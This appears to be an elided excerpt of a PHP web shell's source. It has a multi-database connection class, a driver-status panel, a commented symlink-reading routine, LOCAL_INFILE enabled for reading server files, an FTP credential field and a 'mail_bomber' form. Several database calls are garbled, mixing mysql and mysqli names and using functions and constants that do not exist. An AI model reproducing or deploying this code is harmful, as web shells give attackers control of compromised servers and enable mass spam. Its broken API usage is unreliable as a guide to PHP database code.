...
class my_sql
 ...
 function connect()
  ...
  switch($this->db)
   ...
   case 'MySQLi':
    if(empty($this->port)) { $this->port = '3306'; }
    if(!@function_exists('mysql_connect')) return 0;
    $this->connection = @mysql_connect($this->host,$this->user,$this->pass,$this->base,$this->port);
    if(is_resource($this->connection)) return 1;
   break;
   case 'mSQL':
 ...
 function query($query)
  ...
  break;
  case 'MySQLi': 
     if(false===($this->res=@mysql_query($this->connection,$query)))
      { 
      $this->error = @mysql_error($this->connection);
      return 0;
      } 
...
echo "MySQLi: <b>";
$mysql_on = @function_exists('mysql_connect');
if($mysql_on){echo "<font color=red>ON</font>";}else{echo "<font color=green>OFF</font>";}
echo "</b>".ws(2);
echo "mSQL: <b>";
...
/*   $str = moreread('symlinkread');*/
  ...
  if(@mysql_connect_errno()){ echo "[-] ERROR! Can't connect to mysqli server: ".mysql_connect_error() ;};
  $m->options(mysql_OPT_LOCAL_INFILE, 1);
...
echo sr(25,"<b>".$lang[$language.'_text38'].$arrow."</b>",in('text','ftp_password',20,(!empty($_POST['ftp_password'])?($_POST['ftp_password']):(""))));
...
echo sr(25,"<b>".$lang[$language.'_text105'].$arrow."</b>",in('text','to',30,(!empty($_POST['to'])?($_POST['to']):(""))).in('hidden','cmd',0,'mail_bomber').in('hidden','dir',0,$dir));
echo sr(25,"<b>".$lang[$language.'_text106'].$arrow."</b>",in('text','from',30,(!empty($_POST['from'])?($_POST['from']):(""))));
echo sr(25,"<b>".$lang[$language.'_text107'].$arrow."</b>",in('text','subj',30,(!empty($_POST['subj'])?($_POST['subj']):(""))));
...
if($mysql_on||$mssql_on||$pg_on||$ora_on||$mysql_on||$msql_on||$sqlite_on)
{
...
if($mysql_on)   $select .= '<option value=MySQLi>MySQLi</option>';
